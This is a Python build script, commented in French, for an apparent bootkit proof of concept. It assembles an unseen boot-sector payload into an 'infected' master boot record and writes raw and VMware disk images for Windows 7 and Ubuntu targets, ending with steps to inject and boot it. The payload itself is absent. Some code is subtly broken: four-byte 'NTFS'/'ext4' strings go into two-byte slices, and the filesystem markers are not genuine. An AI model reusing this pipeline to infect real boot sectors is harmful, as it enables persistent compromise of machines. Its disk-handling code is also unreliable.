#!/usr/bin/env python3
"""
Bootkit Implementation POC
==========================

Créer un bootkit qui attaque le secteur de boot.
À utiliser UNIQUEMENT sur VMs isolées pour testing éducatif.

Processus:
1. Compiler mbr_stage1.asm → mbr_stage1.bin (446 bytes)
2. Créer MBR infecté (bootcode + partition table + 0xAA55)
3. Générer images disque pour VMs
4. Tester sur Windows 7 + Ubuntu Server 24 snapshots

WARNING: AUTHORIZED TESTING ONLY
"""

import os
import sys
import struct
import subprocess
from pathlib import Path
from typing import Optional, Tuple


class BootkitPOC:
    """Bootkit implementation and deployment"""

    # MBR Constants
    MBR_SIZE = 512
    BOOTCODE_SIZE = 446
    PARTITION_TABLE_SIZE = 64
    PARTITION_ENTRIES = 4
    PARTITION_ENTRY_SIZE = 16
    SIGNATURE_OFFSET = 510
    SIGNATURE_VALUE = 0xAA55

    def __init__(self, project_root: str = ".", verbose: bool = True):
        """Initialize bootkit builder"""
        self.project_root = Path(project_root)
        self.verbose = verbose

        # Paths
        self.src_dir = self.project_root / "Labsboot" / "src"
        self.build_dir = self.project_root / "Labsboot" / "build"
        self.asm_file = self.src_dir / "mbr_stage1.asm"
        self.bin_file = self.build_dir / "mbr_stage1.bin"
        self.mbr_file = self.build_dir / "bootkit_mbr.bin"

        # Create build directory
        self.build_dir.mkdir(parents=True, exist_ok=True)

    def log(self, message: str, level: str = "INFO"):
        """Log with level indicator"""
        if self.verbose:
            prefix = {
                "INFO": "[✓]",
                "WARN": "[⚠]",
                "ERROR": "[✗]",
                "DEBUG": "[•]"
            }.get(level, "[•]")
            print(f"{prefix} {message}")

    def compile_asm(self) -> bool:
        """Compile mbr_stage1.asm using NASM"""
        if not self.asm_file.exists():
            self.log(f"Fichier ASM non trouvé: {self.asm_file}", "ERROR")
            return False

        self.log(f"Compilation: {self.asm_file.name}")

        try:
            # Try NASM first (preferred assembler)
            result = subprocess.run(
                ["nasm", "-f", "bin", str(self.asm_file), "-o", str(self.bin_file)],
                capture_output=True,
                text=True
            )

            if result.returncode == 0:
                self.log(f"Compilé avec succès: {self.bin_file.name}")
                return True
            else:
                self.log(f"NASM error: {result.stderr}", "ERROR")
                return False

        except FileNotFoundError:
            self.log("NASM non trouvé. Installation requise:", "ERROR")
            self.log("  Windows: choco install nasm", "INFO")
            self.log("  Ubuntu: sudo apt install nasm", "INFO")
            self.log("  macOS: brew install nasm", "INFO")
            return False

    def verify_bootcode_size(self) -> bool:
        """Verify compiled bootcode is <= 446 bytes"""
        if not self.bin_file.exists():
            self.log(f"Fichier compilé non trouvé: {self.bin_file}", "ERROR")
            return False

        size = self.bin_file.stat().st_size
        self.log(f"Taille bootcode: {size} bytes (max {self.BOOTCODE_SIZE})")

        if size > self.BOOTCODE_SIZE:
            self.log(f"ERREUR: Bootcode trop grand ({size} > {self.BOOTCODE_SIZE})", "ERROR")
            return False

        return True

    def create_infected_mbr(self, clean_mbr_path: Optional[str] = None) -> bool:
        """
        Create infected MBR (446 bytes bootcode + 64 bytes partition table + 2 bytes signature)

        Steps:
        1. Read compiled bootcode (or use simple bootcode if no clean MBR)
        2. Create partition table (4 entries, each 16 bytes)
        3. Add boot signature 0xAA55
        4. Save as 512-byte MBR
        """
        self.log("Création MBR infecté")

        # Load bootcode
        if not self.bin_file.exists():
            self.log("Compilation requise d'abord", "ERROR")
            return False

        with open(self.bin_file, 'rb') as f:
            bootcode = f.read()

        # Ensure bootcode is exactly BOOTCODE_SIZE
        if len(bootcode) < self.BOOTCODE_SIZE:
            bootcode = bootcode + b'\x00' * (self.BOOTCODE_SIZE - len(bootcode))
        elif len(bootcode) > self.BOOTCODE_SIZE:
            self.log(f"Bootcode trop volumineux: {len(bootcode)} > {self.BOOTCODE_SIZE}", "ERROR")
            return False

        # Create MBR
        mbr = bytearray(self.MBR_SIZE)

        # Part 1: Bootcode (446 bytes)
        mbr[0:self.BOOTCODE_SIZE] = bootcode

        # Part 2: Partition table (64 bytes)
        if clean_mbr_path and os.path.exists(clean_mbr_path):
            # Preserve partition table from clean MBR
            with open(clean_mbr_path, 'rb') as f:
                clean_mbr = f.read(self.MBR_SIZE)
            mbr[self.BOOTCODE_SIZE:self.BOOTCODE_SIZE + self.PARTITION_TABLE_SIZE] = \
                clean_mbr[self.BOOTCODE_SIZE:self.BOOTCODE_SIZE + self.PARTITION_TABLE_SIZE]
        else:
            # Create minimal partition table (all entries empty or stealth)
            mbr[self.BOOTCODE_SIZE:self.BOOTCODE_SIZE + self.PARTITION_TABLE_SIZE] = b'\x00' * self.PARTITION_TABLE_SIZE

        # Part 3: Boot signature (2 bytes) - 0xAA55
        mbr[self.SIGNATURE_OFFSET] = 0x55
        mbr[self.SIGNATURE_OFFSET + 1] = 0xAA

        # Write MBR
        with open(self.mbr_file, 'wb') as f:
            f.write(mbr)

        self.log(f"MBR infecté créé: {self.mbr_file.name}")
        self.log(f"  - Bootcode: {self.BOOTCODE_SIZE} bytes")
        self.log(f"  - Partition Table: {self.PARTITION_TABLE_SIZE} bytes")
        self.log(f"  - Boot Signature: 2 bytes (0xAA55)")

        return True

    def create_disk_image(self, output_path: str, os_type: str = "windows") -> bool:
        """
        Create VM disk image with infected MBR

        Args:
            output_path: Path to output .img or .vmdk file
            os_type: "windows" or "linux"
        """
        self.log(f"Création image disque: {output_path} ({os_type})")

        if not self.mbr_file.exists():
            self.log("MBR infecté non trouvé", "ERROR")
            return False

        try:
            # Read infected MBR
            with open(self.mbr_file, 'rb') as f:
                mbr = f.read(self.MBR_SIZE)

            # Create disk image (minimal for demo: 1MB)
            disk_size = 1024 * 1024  # 1 MB
            disk = bytearray(disk_size)

            # Write infected MBR at sector 0
            disk[0:self.MBR_SIZE] = mbr

            # For Windows: Add minimal NTFS VBR template at sector 1
            if os_type.lower() == "windows":
                # Simple NTFS VBR marker
                disk[512:512+2] = b'NTFS'  # NTFS signature

            # For Linux: Add minimal ext4 marker
            elif os_type.lower() == "linux":
                # ext4 superblock marker (offset 1024)
                disk[1024:1024+2] = b'ext4'  # ext4 signature

            # Write disk image
            with open(output_path, 'wb') as f:
                f.write(disk)

            self.log(f"Image créée: {output_path} ({disk_size/1024:.0f} KB)")
            return True

        except Exception as e:
            self.log(f"Erreur création image: {e}", "ERROR")
            return False

    def create_vmware_image(self, output_vmdk: str, size_gb: float = 1.0) -> bool:
        """
        Create VMWARE-compatible disk image

        Args:
            output_vmdk: Path to output .vmdk descriptor file
            size_gb: Size in GB
        """
        self.log(f"Création image VMware: {output_vmdk} ({size_gb} GB)")

        if not self.mbr_file.exists():
            self.log("MBR infecté non trouvé", "ERROR")
            return False

        try:
            # Read infected MBR
            with open(self.mbr_file, 'rb') as f:
                mbr = f.read(self.MBR_SIZE)

            # Create disk data file (.img)
            disk_size = int(size_gb * 1024 * 1024 * 1024)  # Convert GB to bytes
            disk_img = output_vmdk.replace('.vmdk', '.img')

            with open(disk_img, 'wb') as f:
                # Write infected MBR
                f.write(mbr)
                # Fill rest with zeros (sparse would be better, but this is simpler)
                # In practice, use dd or similar for sparse files
                remaining = disk_size - self.MBR_SIZE
                chunk_size = 1024 * 1024  # 1 MB chunks
                while remaining > 0:
                    to_write = min(chunk_size, remaining)
                    f.write(b'\x00' * to_write)
                    remaining -= to_write

            # Create VMDK descriptor
            vmdk_content = f"""\
# Disk DescriptorFile
version=1
encoding="UTF-8"
CID=ffffffff
parentCID=ffffffff
isNativeSnapshot="no"
createType="monolithicFlat"

# Extent description
RW {int(size_gb * 1024 * 1024 * 2)} FLAT "{os.path.basename(disk_img)}" 0

# The Disk Data Base
#DDB

ddb.virtualHWVersion = "17"
ddb.geometry.cylinders = "{int(disk_size / (512 * 255 * 63))}"
ddb.geometry.heads = "255"
ddb.geometry.sectors = "63"
ddb.adapterType = "lsilogic"
"""

            with open(output_vmdk, 'w') as f:
                f.write(vmdk_content)

            self.log(f"VMDK créé: {output_vmdk}")
            self.log(f"  - Descriptor: {output_vmdk}")
            self.log(f"  - Data file: {disk_img}")

            return True

        except Exception as e:
            self.log(f"Erreur création VMDK: {e}", "ERROR")
            return False

    def build_all(self) -> bool:
        """Compile and create all bootkit artifacts"""
        self.log("=" * 60)
        self.log("BOOTKIT POC - COMPILATION COMPLÈTE", "INFO")
        self.log("=" * 60)

        # Step 1: Compile ASM
        self.log("\n[1/4] Compilation assembleur...")
        if not self.compile_asm():
            return False

        # Step 2: Verify size
        self.log("\n[2/4] Vérification taille...")
        if not self.verify_bootcode_size():
            return False

        # Step 3: Create infected MBR
        self.log("\n[3/4] Création MBR infecté...")
        if not self.create_infected_mbr():
            return False

        # Step 4: Create disk images
        self.log("\n[4/4] Création images disque...")

        self.create_disk_image(str(self.build_dir / "bootkit_windows7.img"), "windows")
        self.create_disk_image(str(self.build_dir / "bootkit_ubuntu24.img"), "linux")
        self.create_vmware_image(str(self.build_dir / "bootkit_windows7.vmdk"), 40.0)
        self.create_vmware_image(str(self.build_dir / "bootkit_ubuntu24.vmdk"), 50.0)

        # Summary
        self.log("\n" + "=" * 60)
        self.log("COMPILATION COMPLÈTE ✓", "INFO")
        self.log("=" * 60)
        self.log("\nArtifacts générés:")
        self.log(f"  ✓ {self.bin_file.name}")
        self.log(f"  ✓ {self.mbr_file.name}")
        self.log(f"  ✓ bootkit_windows7.img")
        self.log(f"  ✓ bootkit_ubuntu24.img")
        self.log(f"  ✓ bootkit_windows7.vmdk")
        self.log(f"  ✓ bootkit_ubuntu24.vmdk")

        self.log("\nProchaines étapes:")
        self.log("  1. Créer snapshot VM AVANT injection")
        self.log("  2. Injecter MBR infecté dans VM")
        self.log("  3. Redémarrer VM et observer bootkit")
        self.log("  4. Restaurer depuis snapshot")
        self.log("  5. Documenter résultats")

        return True


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Bootkit Implementation POC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 bootkit_implementation.py --build
  python3 bootkit_implementation.py --compile
  python3 bootkit_implementation.py --image bootkit.img
  python3 bootkit_implementation.py --vmware bootkit.vmdk
        """
    )

    parser.add_argument('--build', action='store_true',
                       help='Compilation complète (ASM + MBR + images)')
    parser.add_argument('--compile', action='store_true',
                       help='Compiler assembleur uniquement')
    parser.add_argument('--image', type=str, metavar='OUTPUT',
                       help='Créer image disque')
    parser.add_argument('--vmware', type=str, metavar='OUTPUT.VMDK',
                       help='Créer image VMware VMDK')
    parser.add_argument('--verbose', '-v', action='store_true', default=True,
                       help='Mode verbeux')

    args = parser.parse_args()

    # Get project root
    script_dir = Path(__file__).parent
    project_root = script_dir.parent.parent

    # Initialize bootkit
    bootkit = BootkitPOC(str(project_root), verbose=args.verbose)

    # Execute commands
    if args.build:
        success = bootkit.build_all()
    elif args.compile:
        success = bootkit.compile_asm() and bootkit.verify_bootcode_size()
    elif args.image:
        success = bootkit.create_infected_mbr() and bootkit.create_disk_image(args.image)
    elif args.vmware:
        success = bootkit.create_infected_mbr() and bootkit.create_vmware_image(args.vmware)
    else:
        parser.print_help()
        return 0

    return 0 if success else 1


if __name__ == '__main__':
    sys.exit(main())
